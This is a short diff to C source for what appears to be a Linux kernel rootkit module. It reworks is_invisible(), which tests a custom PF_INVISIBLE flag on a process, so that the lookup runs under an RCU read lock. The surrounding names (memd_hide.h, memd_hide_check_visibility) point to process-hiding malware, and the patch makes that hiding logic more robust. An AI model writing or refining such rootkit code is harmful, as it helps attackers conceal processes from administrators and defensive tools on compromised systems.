@@ -1,16 +1,20 @@
 #include "memd_proc.h"
 #include "memd_hide.h"
 
+#include <linux/rcupdate.h>
+
 int is_invisible(pid_t pid) {
     struct task_struct* task;
+    int ret;
     if (!pid)
         return 0;
+    /* find_task_by_vpid requires RCU read lock; the task pointer must
+     * not be touched outside it (no ref taken). */
+    rcu_read_lock();
     task = find_task_by_vpid(pid);
-    if (!task)
-        return 0;
-    if (task->flags & PF_INVISIBLE)
-        return 1;
-    return 0;
+    ret = (task && (task->flags & PF_INVISIBLE)) ? 1 : 0;
+    rcu_read_unlock();
+    return ret;
 }
 
 bool memd_hide_check_visibility(pid_t pid, struct pid_namespace *ns)
